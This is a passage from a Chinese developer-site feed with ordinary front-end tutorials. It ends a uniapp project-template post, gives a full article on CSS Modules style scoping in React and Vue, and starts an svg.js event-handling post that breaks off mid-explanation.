<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isReleaseVersion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> accountInfo = wx.<span class="hljs-title function_">getAccountInfoSync</span>();
  <span class="hljs-keyword">return</span> accountInfo.<span class="hljs-property">miniProgram</span>?.<span class="hljs-property">envVersion</span> === <span class="hljs-string">'release'</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-20">六、页面缓存</h3>
<p>解决小程序 URL 参数长度限制（约 2KB）。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { savePageCache, getPageCache, clearPageCache } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/cache.js'</span>;

<span class="hljs-comment">// 页面 A：保存数据后跳转</span>
<span class="hljs-title function_">savePageCache</span>(<span class="hljs-string">'/pages/detail'</span>, { <span class="hljs-attr">orderId</span>: <span class="hljs-number">123</span>, <span class="hljs-attr">items</span>: [...] });
uni.<span class="hljs-title function_">navigateTo</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/detail'</span> });

<span class="hljs-comment">// 页面 B：获取数据</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">getPageCache</span>(<span class="hljs-string">'/pages/detail'</span>);
<span class="hljs-title function_">clearPageCache</span>(<span class="hljs-string">'/pages/detail'</span>);  <span class="hljs-comment">// 用完清理</span>
</code></pre>
<hr/>
<h3 data-id="heading-21">七、样式管理</h3>
<h4 data-id="heading-22">7.1 SCSS 变量</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// src/styles/variables.scss</span>
<span class="hljs-variable">$primary-color</span>: <span class="hljs-number">#007aff</span>;
<span class="hljs-variable">$text-color</span>: <span class="hljs-number">#333</span>;
<span class="hljs-variable">$border-color</span>: <span class="hljs-number">#eee</span>;
<span class="hljs-variable">$page-padding</span>: <span class="hljs-number">30</span>rpx;
</code></pre>
<h4 data-id="heading-23">7.2 全局引入</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-attr">css</span>: {
  <span class="hljs-attr">preprocessorOptions</span>: {
    <span class="hljs-attr">scss</span>: {
      <span class="hljs-attr">additionalData</span>: <span class="hljs-string">'@import "@/styles/variables.scss";'</span>,
    },
  },
}
</code></pre>
<hr/>
<h3 data-id="heading-24">八、使用模板</h3>
<h4 data-id="heading-25">8.1 克隆项目</h4>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/220529/uniapp-template.git my-project
<span class="hljs-built_in">cd</span> my-project
pnpm install
</code></pre>
<h4 data-id="heading-26">8.2 修改配置</h4>
<ol>
<li><code>.env</code> - 修改 API 地址</li>
<li><code>src/manifest.json</code> - 修改小程序 appid</li>
<li><code>package.json</code> - 修改项目名称</li>
</ol>
<h4 data-id="heading-27">8.3 启动开发</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm run dev:mp-weixin  <span class="hljs-comment"># 微信小程序</span>
pnpm run dev:h5         <span class="hljs-comment"># H5</span>
</code></pre>
<hr/>
<h3 data-id="heading-28">总结</h3>
<p>这套模板包含了企业级项目常用的功能：</p>





























<table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>工程化</td><td>ESLint + Prettier + Husky + Commitizen</td></tr><tr><td>请求层</td><td>封装、拦截器、取消机制、防重复</td></tr><tr><td>认证</td><td>Token 管理、自动刷新、并发控制</td></tr><tr><td>环境</td><td>多环境切换、线上锁定</td></tr><tr><td>工具</td><td>页面缓存、样式变量</td></tr></tbody></table>
<p>开箱即用，新项目直接基于模板开发即可。</p>
<hr/>
<p>如果觉得有帮助，欢迎 Star ⭐</p>
<hr/>
<blockquote>
<p>📦 项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F220529%2Funiapp-template" target="_blank" title="https://github.com/220529/uniapp-template" ref="nofollow noopener noreferrer">github.com/220529/unia…</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS Modules：现代前端组件化样式的安全边界]]></title>    <link>https://juejin.cn/post/7592944032773324851</link>    <guid>https://juejin.cn/post/7592944032773324851</guid>    <pubDate>2026-01-09T05:25:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032773324851" data-draft-id="7592997693069344778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" CSS Modules：现代前端组件化样式的安全边界"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T05:25:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无敌的拖拉斯旋风"/> <meta itemprop="url" content="https://juejin.cn/user/951508170179208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             CSS Modules：现代前端组件化样式的安全边界
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/951508170179208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无敌的拖拉斯旋风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:25:44.000Z" title="Fri Jan 09 2026 05:25:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React、Vue 等现代前端框架盛行的时代， <strong>“样式污染”</strong>  曾是团队协作中最令人头疼的问题之一。<br/>
一个简单的 <code>.button</code> 类，可能在 A 组件中是蓝色圆角，在 B 组件中却是红色方块——只因为两个开发者“恰好”用了相同的名字。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/544c3528509448f29c819ee8e6e320bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=gGpBZJTOJ2t1IE7eZoINRVXmtQE%3D" alt="css-demo.png" loading="lazy"/>
而 <strong>CSS Modules</strong> 的出现，正是为了解决这一痛点，它用一种优雅而可靠的方式，为 CSS 赋予了<strong>组件级作用域（Scoped Styles）</strong>  的能力。</p>
<hr/>
<h2 data-id="heading-0">一、传统 CSS 的困境：全局污染与命名焦虑</h2>
<p>CSS 本质是<strong>全局作用域</strong>的语言：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* global.css */</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: blue;
}
</code></pre>
<p>一旦引入，所有 <code>&lt;button class="button"&gt;</code> 都会被影响。<br/>
在大型项目中，开发者不得不采用各种“防御性命名”策略：</p>
<ul>
<li>BEM 命名法：<code>.my-component__button--primary</code></li>
<li>前缀约定：<code>.app-header-btn</code></li>
<li>深层嵌套：<code>.page .sidebar .nav .item</code></li>
</ul>
<p>这不仅增加了心智负担，还无法从根本上避免冲突。</p>
<hr/>
<h2 data-id="heading-1">二、CSS Modules：让样式“私有化”</h2>
<p>CSS Modules 是一种<strong>将 CSS 文件编译为 JavaScript 对象</strong>的技术，核心思想是：</p>
<blockquote>
<p><strong>每个类名在构建时被自动转换为全局唯一的标识符（通常带哈希），从而实现样式隔离。</strong></p>
</blockquote>
<h3 data-id="heading-2">基本用法（以 React 为例）</h3>
<ol>
<li>
<p>创建一个 <code>Button.module.css</code> 文件：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* Button.module.css */</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#007bff</span>;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}
</code></pre>
</li>
<li>
<p>在组件中导入并使用：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Button.jsx</span>
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./Button.module.css'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.button}</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
</li>
<li>
<p>构建后，实际生成的 HTML 可能是：</p>
<p>html</p>
<pre><code class="hljs language-ini" lang="ini">&lt;button <span class="hljs-attr">class</span>=<span class="hljs-string">"Button_button__abc123"</span>&gt;Click Me&lt;/button&gt;
</code></pre>
</li>
</ol>
<p>其中 <code>__abc123</code> 是 Webpack 或 Vite 自动生成的哈希后缀，确保<strong>即使多个组件都定义了 <code>.button</code>，也不会互相干扰</strong>。</p>
<hr/>
<h2 data-id="heading-3">三、React/Vue 如何实现样式作用域？</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3b05554e77e4d35ba22e44bf428e4c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=QoAhB08GtEPfxcRo%2FmfQ1vQ8d3A%3D" alt="vue-css-demo.png" loading="lazy"/>
表格</p>

















<table><thead><tr><th>框架</th><th>实现方式</th></tr></thead><tbody><tr><td><strong>React</strong></td><td>通过构建工具（如 Webpack、Vite）支持 <code>*.module.css</code>，自动重命名类名</td></tr><tr><td><strong>Vue</strong></td><td>在单文件组件（SFC）中使用 <code>&lt;style scoped&gt;</code>，编译时为每个元素添加唯一 <code>data-v-xxx</code> 属性，并限定 CSS 选择器</td></tr></tbody></table>
<p>两者殊途同归：<strong>将样式限制在组件内部，不污染全局，也不受外界影响</strong>。</p>
<hr/>
<h2 data-id="heading-4">四、CSS Modules 的核心优势</h2>
<h3 data-id="heading-5">1. <strong>样式隔离（Isolation）</strong></h3>
<ul>
<li>组件 A 的 <code>.title</code> 不会影响组件 B 的 <code>.title</code></li>
<li>彻底告别“样式覆盖”和“意外继承”</li>
</ul>
<h3 data-id="heading-6">2. <strong>可预测性（Predictability）</strong></h3>
<ul>
<li>你写的样式就是最终生效的样式</li>
<li>不再需要猜测“哪个 CSS 文件最后加载？”</li>
</ul>
<h3 data-id="heading-7">3. <strong>安全共享（Safe Sharing）</strong></h3>
<ul>
<li>开源组件库（如 Ant Design、Material UI）可放心使用 CSS Modules</li>
<li>多人协作时，无需协调命名规范</li>
</ul>
<h3 data-id="heading-8">4. <strong>Tree-shaking 友好</strong></h3>
<ul>
<li>未使用的 CSS 类在构建时可被自动移除（配合 PurgeCSS 等工具）</li>
</ul>
<hr/>
<h2 data-id="heading-9">五、进阶技巧：组合与复用</h2>
<p>虽然 CSS Modules 强调隔离，但并不意味着不能复用。</p>
<h3 data-id="heading-10">使用 <code>composes</code>（较少用）</h3>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* base.module.css */</span>
<span class="hljs-selector-class">.primary</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-comment">/* Button.module.css */</span>
<span class="hljs-selector-class">.btn</span> {
  composes: primary from <span class="hljs-string">'./base.module.css'</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<h3 data-id="heading-11">更推荐：通过 props 控制变体</h3>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Button.jsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">{ variant = <span class="hljs-string">'default'</span> }</span>) {
  <span class="hljs-keyword">const</span> className = variant === <span class="hljs-string">'primary'</span> 
    ? <span class="hljs-string">`<span class="hljs-subst">${styles.button}</span> <span class="hljs-subst">${styles.primary}</span>`</span> 
    : styles.<span class="hljs-property">button</span>;
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{className}</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<p>或者结合 <strong>Tailwind CSS</strong> 等原子化方案，实现更灵活的样式组合。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aeb4deb4fed42179bf6f30564e192ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=VvDzwPoNz55c%2BR%2BX3XiTcc1Nd%2F0%3D" alt="styled-components.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-12">六、何时不该用 CSS Modules？</h2>
<ul>
<li>
<p><strong>全局样式</strong>（如 reset、字体、布局容器）→ 应放在 <code>globals.css</code></p>
</li>
<li>
<p><strong>主题切换</strong> → 可配合 CSS 变量（<code>--primary-color</code>）实现</p>
</li>
<li>
<p><strong>动态类名</strong>（如 <code>class={isActive ? 'active' : ''}</code>）→ 仍可用，但需注意模块化写法：</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">className</span>={`<span class="hljs-variable">${styles.button}</span> <span class="hljs-variable">${isActive ? styles.active : ''}</span>`}
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-13">结语：从“管理混乱”到“安心编码”</h2>
<p>CSS Modules 并不是银弹，但它代表了一种重要的工程思想：</p>
<blockquote>
<p><strong>将副作用最小化，让组件真正成为“自包含”的单元。</strong></p>
</blockquote>
<p>在微前端、组件库、多人协作等场景下，这种“样式安全边界”显得尤为珍贵。<br/>
它让我们可以像写函数一样写组件——输入 props，输出 UI，<strong>无需担心外部世界的干扰</strong>。</p>
<p>正如一句前端格言所说：</p>
<blockquote>
<p>“好的组件，连它的样式都应该是私有的。”</p>
</blockquote>
<p>而 CSS Modules，正是实现这一理想的坚实基石。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SVG学习（五）]]></title>    <link>https://juejin.cn/post/7592876744527298610</link>    <guid>https://juejin.cn/post/7592876744527298610</guid>    <pubDate>2026-01-09T03:52:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744527298610" data-draft-id="7592903126178349106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SVG学习（五）"/> <meta itemprop="keywords" content="前端,SVG"/> <meta itemprop="datePublished" content="2026-01-09T03:52:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="谜亚星"/> <meta itemprop="url" content="https://juejin.cn/user/2752832848537944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SVG学习（五）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2752832848537944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    谜亚星
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:52:26.000Z" title="Fri Jan 09 2026 03:52:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在svg.js中，给元素绑定事件，也和html中一样，“元素.事件名”就行，而且也支持click，mouseover等多种事件，例如</p>
<pre><code class="hljs language-javascript" lang="javascript">element.<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fill</span>({ <span class="hljs-attr">color</span>: <span class="hljs-string">'#f06'</span> })
})
</code></pre>
<p>其中的this就指向当前元素。不过要注意，svg本身是不支持scroll滚动的。</p>
<p>如果想移除事件，就将事件设置为null就行</p>
<pre><code class="hljs language-csharp" lang="csharp">element.click(<span class="hljs-literal">null</span>)
</code></pre>
<p>对于触发事件，svg.js有两种方式，fire和dispatch，两者都可以传递第二个参数来传参，区别在于返回值。fire的返回值是当前元素，dispatch是事件event对象</p>
<p>监听事件和html中一样，使用on方法</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">click</span> = <span class="hljs-selector-tag">function</span>() {
  <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.fill</span>({ <span class="hljs-attribute">color</span>: <span class="hljs-string">'#f06'</span> })
}
element.<span class="hljs-built_in">on</span>(<span class="hljs-string">'click'</span>, click)
element.<span class="hljs-built_in">fire</span>(<span class="hljs-string">'click'</span>)
element.<span class="hljs-built_in">dispatch</span>(<span class="hljs-string">'click'</span>)
</code></pre>
<p>可以同时监听多个事件</p>
<pre><code class="hljs language-csharp" lang="csharp">element.<span class="hljs-keyword">on</span>([<span class="hljs-string">'click'</span>, <span class="hljs-string">'mouseover'</span>], handler)
element.<span class="hljs-keyword">on</span>(<span class="hljs-string">'click mouseover'</span>, handler)
</code></pre>
<p>也可以改变函数中this的指向</p>
